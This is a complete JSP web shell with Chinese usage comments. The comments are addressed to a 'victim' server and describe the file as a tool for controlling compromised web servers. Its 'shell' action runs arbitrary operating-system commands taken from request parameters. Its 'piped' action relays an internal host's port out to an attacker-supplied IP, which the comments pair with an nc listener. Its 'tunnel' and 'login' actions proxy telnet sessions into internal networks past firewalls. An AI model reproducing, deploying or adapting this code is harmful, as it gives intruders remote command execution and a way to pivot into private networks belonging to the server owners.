<%
/*
* WEBSHELL.JSP
*
* Author: lovehacker
* E-mail: wangyun188@hotmail.com
*
* 使用方法: 
* ]http://victim/webshell.jsp?[options]
* options:
* action=piped&remoteHost=&remotePort=&myIp=&myPort=
* action=tunnel&remoteHost=&remotePort=&myPort=
* action=login&username=&password=&myPort=
* action=send&myShell=&myPort=&cmd=
* action=close&myPort=
* action=shell&cmd=
* 例子：
* action=piped&remoteHost=192.168.0.1&remotePort=25&myIp=218.0.0.1&myPort=12345 -- 将192.168.0.1的25端口与218.0.0.1的12345端口连接起来（可以先用NC监听12345端口）。适用于你无法直接访问已控制的WEB服务器的内网里某机器的某端口，而防火墙又未过滤该WEB服务器向外的连接。
* action=tunnel&remoteHost=192.168.0.1&remotePort=23&myPort=65534 -- 实现通过访问该webshell.jsp访问内网某主机telnet服务的功能。（原本想实现通过访问webshell.jsp实现对内网任意服务访问的功能，但jsp功能有限实现起来较为复杂），适用于你控制的机器只开了80端口，并且防火墙不允许它访问Internet，而你又非常想访问它内网某主机的Telnet服务:-)
* action=login&username=root&password=helloroot&myPort=65534 -- 上一步只是告诉了要Telnet那台机器，这一步才开始真正登陆，你要输入要telnet主机的正确的用户名密码才行喔，要不然谁也没办法。
* action=send&myShell=&myPort=&cmd= -- 上一步如果顺利完成，那么你就可以在上边执行你想执行的命令了。myShell这个参数是结束标记，否则无法知道数据流什么时间该结束（一定要写对喔，否则嘿嘿，就麻烦罗）。cmd这个参数就是你要执行的命令了，比如：“which ssh”，建议你这样玩：myShell=lovehacker&cmd=ls -la;echo lovehacker。
* action=close&myPort= -- 你是退出了telnet登陆，但程序在主机上开放的端口还没关闭，所以你要再执行这个命令，现场打扫干净嘛。
* action=shell&cmd= -- 在你控制的这台机器上执行命令。Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\winnt\system32\cmd.exe /c type c:\winnt\win.ini
* 程序说明：
* 想通过jsp实现telnet代理的时候着实头痛了一把，每个请求都是一个新的线程，client socket去连接
* telnet服务只能批量命令，无法实现与用户的交互，后来想了个笨办法：把telnet的过程分步完成，接
* 收到tunnel命令后，先起两个线程，一个监听端口等待连接，一个先和远程服务器建立好端口连接并一
* 直不断开，这下server socket再一次一次的收数据，一次次的转发到远程服务器，就可以记录状态，实
* 现和用户的交互了，但总觉得这办法太笨，如果用JSP实现telnet代理功能，你有更好的办法的话请一定
* 要来信告诉我。
* 版权说明：
* 本身实现Telnet的功能我也是在人家代码的基础上修改的，所以：版权没有，你可以任意修改、复制。
* 只是加了新功能别忘了Mail一份给我喔！
*
*
*/
%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.awt.Dimension" %>
<%
class redirector implements Runnable
{
private redirector companion = null;
private Socket localSocket, remoteSocket;
private InputStream from;
private OutputStream to;
private byte[] buffer = new byte[4096];

public redirector(Socket local, Socket remote)
{
try {
localSocket = local;
remoteSocket = remote;
from = localSocket.getInputStream();
to = remoteSocket.getOutputStream();
} catch(Exception e) {}
}

public void couple(redirector c) { 
companion = c; 
Thread listen = new Thread(this);
listen.start();
}

public void decouple() { companion = null; }

public void run()
{
int count;
try {
while(companion != null) {
if((count = from.read(buffer)) < 0)
break;
to.write(buffer, 0, count);
}
} catch(Exception e) {}
try {
from.close();
to.close();
localSocket.close();
remoteSocket.close();
if(companion != null) companion.decouple();
} catch(Exception io) {}
}
}

class redirector1 implements Runnable
{
private redirector1 companion = null;
private Socket localSocket, remoteSocket;
private InputStream from;
private OutputStream to;
private byte[] buffer = new byte[4096];

public redirector1(Socket local, Socket remote)
{
try {
localSocket = local; 
remoteSocket = remote;
from = localSocket.getInputStream();
to = remoteSocket.getOutputStream();
} catch(Exception e) {}
}

public void couple(redirector1 c) { 
companion = c; 
Thread listen = new Thread(this);
listen.start();
}

public void decouple() { companion = null; }

public void run()
{
String tmp = "";
int count;
try {
while(companion != null) {
if((count = from.read(buffer)) < 0) break;
tmp = new String(buffer);
if(tmp.startsWith("--GoodBye--")) 
{
from.close();
to.close();
remoteSocket.close();
localSocket.close();
System.exit(1);
}
to.write(buffer, 0, count);
}
} catch(Exception e) {}
try {
if(companion != null) companion.decouple();
} catch(Exception io) {}
}
}

class piped implements Runnable
{
String remoteHost1,remoteHost2;
int remotePort1, remotePort2;

Thread listener, connection;


public piped(String raddr1,int rport1, String raddr2, int rport2)
{
remoteHost1 = raddr1; remotePort1 = rport1;
remoteHost2 = raddr2; remotePort2 = rport2;
listener = new Thread(this);
listener.setPriority(Thread.MIN_PRIORITY);
listener.start();
}

public void run()
{
Socket destinationSocket1 = null;
Socket destinationSocket2 = null;
try {
destinationSocket1 = new Socket(remoteHost1,remotePort1);
destinationSocket2 = new Socket(remoteHost2, remotePort2);
redirector r1 = new redirector(destinationSocket1, destinationSocket2);
redirector r2 = new redirector(destinationSocket2, destinationSocket1);
r1.couple(r2);
r2.couple(r1);
} catch(Exception e) {
try {
DataOutputStream os = new DataOutputStream(destinationSocket2.getOutputStream());
os.writeChars("Remote host refused connection.\n");
destinationSocket2.close();
} catch(IOException ioe) { }
}
}
}

class tunnel implements Runnable
{
String remoteHost;
int localPort, remotePort;

Thread listener, connection;

ServerSocket server;

public tunnel(int lport, String raddr, int rport)
{
localPort = lport;
remoteHost = raddr; remotePort = rport;

try {
server = new ServerSocket(localPort);
} catch(Exception e) {}

listener = new Thread(this);
listener.setPriority(Thread.MIN_PRIORITY);
listener.start();
}

public void run()
{
Socket destinationSocket = null;
try{
destinationSocket = new Socket(remoteHost, remotePort);
}catch(Exception e){}
while(true)
{
Socket localSocket = null;
try {
localSocket = server.accept();
} catch(Exception e) {
continue;
}
try {
redirector1 r1 = new redirector1(localSocket, destinationSocket);
redirector1 r2 = new redirector1(destinationSocket, localSocket);
r1.couple(r2);
r2.couple(r1);
} catch(Exception e) {
try {
DataOutputStream os = new DataOutputStream(localSocket.getOutputStream());
os.writeChars("Remote host refused connection.\n");
localSocket.close();
} catch(IOException ioe) {}
continue;
}
}
}
}

class TelnetIO
{
public String toString() { return "$Id: TelnetIO.java,v 1.10 1998/02/09 10:22:18 leo Exp $"; }

private int debug = 0;

private byte neg_state = 0;

private final static byte STATE_DATA = 0;
private final static byte STATE_IAC = 1;
private final static byte STATE_IACSB = 2;
private final static byte STATE_IACWILL = 3;
private final static byte STATE_IACDO = 4;
private final static byte STATE_IACWONT = 5;
private final static byte STATE_IACDONT = 6;
private final static byte STATE_IACSBIAC = 7;
private final static byte STATE_IACSBDATA = 8;
private final static byte STATE_IACSBDATAIAC = 9;

private byte current_sb;

private final static byte IAC = (byte)255;

private final static byte EOR = (byte)239;

private final static byte WILL = (byte)251;

private final static byte WONT = (byte)252;

private final static byte DO = (byte)253;

private final static byte DONT = (byte)254;

private final static byte SB = (byte)250;

private final static byte SE = (byte)240;

private final static byte TELOPT_ECHO = (byte)1; /* echo on/off */

private final static byte TELOPT_EOR = (byte)25; /* end of record */

private final static byte TELOPT_NAWS = (byte)31; /* NA-WindowSize*/

private final static byte TELOPT_TTYPE = (byte)24; /* terminal type */

private final byte[] IACWILL = { IAC, WILL };
private final byte[] IACWONT = { IAC, WONT };
private final byte[] IACDO = { IAC, DO };
private final byte[] IACDONT = { IAC, DONT };
private final byte[] IACSB = { IAC, SB };
private final byte[] IACSE = { IAC, SE };

private final byte TELQUAL_IS = (byte)0;

private final byte TELQUAL_SEND = (byte)1;

private byte[] receivedDX;

private byte[] receivedWX;

private byte[] sentDX;

private byte[] sentWX;

private Socket socket;
private BufferedInputStream is;
private BufferedOutputStream os;

//private StatusPeer peer = this; /* peer, notified on status */

public void connect(String address, int port) throws IOException {
if(debug > 0) System.out.println("Telnet.connect("+address+","+port+")");
socket = new Socket(address, port);
is = new BufferedInputStream(socket.getInputStream());
os = new BufferedOutputStream(socket.getOutputStream());
neg_state = 0;
receivedDX = new byte[256]; 
sentDX = new byte[256];
receivedWX = new byte[256]; 
sentWX = new byte[256];
}

public void disconnect() throws IOException {
if(debug > 0) System.out.println("TelnetIO.disconnect()");
if(socket !=null) socket.close();
}

public void connect(String address) throws IOException {
connect(address, 23);
}

//public void setPeer(StatusPeer obj) { peer = obj; }

public int available() throws IOException
{
return is.available();
}

public byte[] receive() throws IOException {
int count = is.available();
byte buf[] = new byte[count];
count = is.read(buf);
if(count < 0) throw new IOException("Connection closed.");
if(debug > 1) System.out.println("TelnetIO.receive(): read bytes: "+count);
buf = negotiate(buf, count);
return buf;
}

public void send(byte[] buf) throws IOException {
if(debug > 1) System.out.println("TelnetIO.send("+buf+")");
os.write(buf);
os.flush();
}

public void send(byte b) throws IOException {
if(debug > 1) System.out.println("TelnetIO.send("+b+")");
os.write(b);
os.flush();
}

private void handle_sb(byte type, byte[] sbdata, int sbcount) 
throws IOException 
{
if(debug > 1) 
System.out.println("TelnetIO.handle_sb("+type+")");
switch (type) {
case TELOPT_TTYPE:
if (sbcount>0 && sbdata[0]==TELQUAL_SEND) {
String ttype;
send(IACSB);send(TELOPT_TTYPE);send(TELQUAL_IS);
/* FIXME: need more logic here if we use 
* more than one terminal type
*/
Vector vec = new Vector(2);
vec.addElement("TTYPE");
ttype = (String)notifyStatus(vec);
if(ttype == null) ttype = "dumb";
byte[] bttype = new byte[ttype.length()];

ttype.getBytes(0,ttype.length(), bttype, 0);
send(bttype);
send(IACSE);
}

}
}

public Object notifyStatus(Vector status) {
if(debug > 0) 
System.out.println("TelnetIO.notifyStatus("+status+")");
return null;
}

private byte[] negotiate(byte buf[], int count) throws IOException {
if(debug > 1) 
System.out.println("TelnetIO.negotiate("+buf+","+count+")");
byte nbuf[] = new byte[count];
byte sbbuf[] = new byte[count];
byte sendbuf[] = new byte[3];
byte b,reply;
int sbcount = 0;
int boffset = 0, noffset = 0;
Vector vec = new Vector(2);

while(boffset < count) {
b=buf[boffset++];

if (b>=128)
b=(byte)((int)b-256);
switch (neg_state) {
case STATE_DATA:
if (b==IAC) {
neg_state = STATE_IAC;
} else {
nbuf[noffset++]=b;
}
break;
case STATE_IAC:
switch (b) {
case IAC:
if(debug > 2) 
System.out.print("IAC ");
neg_state = STATE_DATA;
nbuf[noffset++]=IAC;
break;
case WILL:
if(debug > 2)
System.out.print("WILL ");
neg_state = STATE_IACWILL;
break;
case WONT:
if(debug > 2)
System.out.print("WONT ");
neg_state = STATE_IACWONT;
break;
case DONT:
if(debug > 2)
System.out.print("DONT ");
neg_state = STATE_IACDONT;
break;
case DO:
if(debug > 2)
System.out.print("DO ");
neg_state = STATE_IACDO;
break;
case EOR:
if(debug > 2)
System.out.print("EOR ");
neg_state = STATE_DATA;
break;
case SB:
if(debug > 2)
System.out.print("SB ");
neg_state = STATE_IACSB;
sbcount = 0;
break;
default:
if(debug > 2)
System.out.print(
"<UNKNOWN "+b+" > "
);
neg_state = STATE_DATA;
break;
}
break;
case STATE_IACWILL:
switch(b) {
case TELOPT_ECHO:
if(debug > 2) 
System.out.println("ECHO");
reply = DO;
vec = new Vector(2);
vec.addElement("NOLOCALECHO");
notifyStatus(vec);
break;
case TELOPT_EOR:
if(debug > 2) 
System.out.println("EOR");
reply = DO;
break;
default:
if(debug > 2)
System.out.println(
"<UNKNOWN,"+b+">"
);
reply = DONT;
break;
}
if(debug > 1)
System.out.println("<"+b+", WILL ="+WILL+">");
if ( reply != sentDX[b+128] ||
WILL != receivedWX[b+128]
) {
sendbuf[0]=IAC;
sendbuf[1]=reply;
sendbuf[2]=b;
send(sendbuf);
sentDX[b+128] = reply;
receivedWX[b+128] = WILL;
}
neg_state = STATE_DATA;
break;
case STATE_IACWONT:
switch(b) {
case TELOPT_ECHO:
if(debug > 2) 
System.out.println("ECHO");

vec = new Vector(2);
vec.addElement("LOCALECHO");
notifyStatus(vec);
reply = DONT;
break;
case TELOPT_EOR:
if(debug > 2) 
System.out.println("EOR");
reply = DONT;
break;
default:
if(debug > 2) 
System.out.println(
"<UNKNOWN,"+b+">"
);
reply = DONT;
break;
}
if ( reply != sentDX[b+128] ||
WONT != receivedWX[b+128]
) {
sendbuf[0]=IAC;
sendbuf[1]=reply;
sendbuf[2]=b;
send(sendbuf);
sentDX[b+128] = reply;
receivedWX[b+128] = WILL;
}
neg_state = STATE_DATA;
break;
case STATE_IACDO:
switch (b) {
case TELOPT_ECHO:
if(debug > 2) 
System.out.println("ECHO");
reply = WILL;
vec = new Vector(2);
vec.addElement("LOCALECHO");
notifyStatus(vec);
break;
case TELOPT_TTYPE:
if(debug > 2) 
System.out.println("TTYPE");
reply = WILL;
break;
case TELOPT_NAWS:
if(debug > 2) 
System.out.println("NAWS");
vec = new Vector(2);
vec.addElement("NAWS");
Dimension size = (Dimension)
notifyStatus(vec);
receivedDX[b] = DO;
if(size == null)
{
/* this shouldn't happen */
send(IAC);
send(WONT);
send(TELOPT_NAWS);
reply = WONT;
sentWX[b] = WONT;
break;
}
reply = WILL;
sentWX[b] = WILL;
sendbuf[0]=IAC;
sendbuf[1]=WILL;
sendbuf[2]=TELOPT_NAWS;
send(sendbuf);
send(IAC);send(SB);send(TELOPT_NAWS);
send((byte) (size.width >> 8));
send((byte) (size.width & 0xff));
send((byte) (size.height >> 8));
send((byte) (size.height & 0xff));
send(IAC);send(SE);
break;
default:
if(debug > 2) 
System.out.println(
"<UNKNOWN,"+b+">"
);
reply = WONT;
break;
}
if ( reply != sentWX[128+b] ||
DO != receivedDX[128+b]
) {
sendbuf[0]=IAC;
sendbuf[1]=reply;
sendbuf[2]=b;
send(sendbuf);
sentWX[b+128] = reply;
receivedDX[b+128] = DO;
}
neg_state = STATE_DATA;
break;
case STATE_IACDONT:
switch (b) {
case TELOPT_ECHO:
if(debug > 2) 
System.out.println("ECHO");
reply = WONT;
vec = new Vector(2);
vec.addElement("NOLOCALECHO");
notifyStatus(vec);
break;
case TELOPT_NAWS:
if(debug > 2) 
System.out.println("NAWS");
reply = WONT;
break;
default:
if(debug > 2) 
System.out.println(
"<UNKNOWN,"+b+">"
);
reply = WONT;
break;
}
if ( reply != sentWX[b+128] ||
DONT != receivedDX[b+128]
) {
send(IAC);send(reply);send(b);
sentWX[b+128] = reply;
receivedDX[b+128] = DONT;
}
neg_state = STATE_DATA;
break;
case STATE_IACSBIAC:
if(debug > 2) System.out.println(""+b+" ");
if (b == IAC) {
sbcount = 0;
current_sb = b;
neg_state = STATE_IACSBDATA;
} else {
System.out.println("(bad) "+b+" ");
neg_state = STATE_DATA;
}
break;
case STATE_IACSB:
if(debug > 2) System.out.println(""+b+" ");
switch (b) {
case IAC:
neg_state = STATE_IACSBIAC;
break;
default:
current_sb = b;
sbcount = 0;
neg_state = STATE_IACSBDATA;
break;
}
break;
case STATE_IACSBDATA:
if (debug > 2) System.out.println(""+b+" ");
switch (b) {
case IAC:
neg_state = STATE_IACSBDATAIAC;
break;
default:
sbbuf[sbcount++] = b;
break;
}
break;
case STATE_IACSBDATAIAC:
if (debug > 2) System.out.println(""+b+" ");
switch (b) {
case IAC:
neg_state = STATE_IACSBDATA;
sbbuf[sbcount++] = IAC;
break;
case SE:
handle_sb(current_sb,sbbuf,sbcount);
current_sb = 0;
neg_state = STATE_DATA;
break;
case SB:
handle_sb(current_sb,sbbuf,sbcount);
neg_state = STATE_IACSB;
break;
default:
neg_state = STATE_DATA;
break;
}
break;
default:
if (debug > 2) 
System.out.println(
"This should not happen: "+
neg_state+" "
);
neg_state = STATE_DATA;
break;
}
}
buf = new byte[noffset];
System.arraycopy(nbuf, 0, buf, 0, noffset);
return buf;
}
}

class TelnetConnect
{
TelnetIO tio = new TelnetIO();
int port = 0;
public TelnetConnect(int port)
{
this.port = port;
}

public void connect()
{
try {
tio.connect("localhost",port);
} catch(IOException e) {}
}

public void disconnect()
{
try{
tio.disconnect();
}catch(IOException e){}
}

private String wait(String prompt)
{
String tmp = "";
do {
try { 
tmp += new String(tio.receive(), 0); 
}catch(IOException e) {}
} while(tmp.indexOf(prompt) == -1);
return tmp;
}

private byte[] receive()
{
byte[] temp = null;
try{
temp = tio.receive();
}catch(IOException e){}
return temp;
}

private String waitshell()
{
String tmp = "";
do {
try { tmp += new String(tio.receive(), 0); }
catch(IOException e) {}
} while((tmp.indexOf("$") == -1)&&(tmp.indexOf("#") == -1)&&(tmp.indexOf("%") == -1));
return tmp;
}

private void send(String str)
{
byte[] buf = new byte[str.length()];
str.getBytes(0, str.length(), buf, 0);
try { tio.send(buf); } catch(IOException e) {}
}
}
%>
<%
String action = request.getParameter("action");
String cmd = request.getParameter("cmd");
String remoteHost = request.getParameter("remoteHost");
String myIp = request.getParameter("myIp");
String myPort = request.getParameter("myPort");
String remotePort = request.getParameter("remotePort");
String username = request.getParameter("username");
String password = request.getParameter("password");
String myShell = request.getParameter("myShell");
if(action.equals("shell")){
try {
Process child = Runtime.getRuntime().exec(cmd);
InputStream in = child.getInputStream();
int c;
while ((c = in.read()) != -1) { out.print((char)c); }
in.close();
try { child.waitFor();} catch (InterruptedException e) {}
} catch (IOException e) {}
}else if(action.equals("piped")){
piped me = new piped(remoteHost,Integer.parseInt(remotePort),myIp,Integer.parseInt(myPort));
}else if(action.equals("tunnel")){
tunnel me = new tunnel(Integer.parseInt(myPort), 
remoteHost, Integer.parseInt(remotePort));
}else if(action.equals("login")){
TelnetConnect tc = new TelnetConnect(Integer.parseInt(myPort));
tc.connect();
out.print(tc.wait("login:"));
tc.send(username+"\r");
out.print(tc.wait("Password:"));
tc.send(password+"\r");
out.print(tc.waitshell());
tc.disconnect();
}else if(action.equals("send")){
TelnetConnect tc = new TelnetConnect(Integer.parseInt(myPort));
tc.connect();
tc.send(cmd+"\r");
if(!myShell.equals("logout"))
out.print(tc.wait(myShell));
tc.disconnect();
}else if(action.equals("close")){
try{
Socket s = new Socket("127.0.0.1",Integer.parseInt(myPort));
DataOutputStream dos = new DataOutputStream(s.getOutputStream());
PrintStream ps = new PrintStream(dos);
ps.println("--GoodBye--");
ps.close();
dos.close();
s.close();
}catch(Exception e){}
}else{
out.print("<Font color=black size=7>You Love Hacker Too?");
}
%>
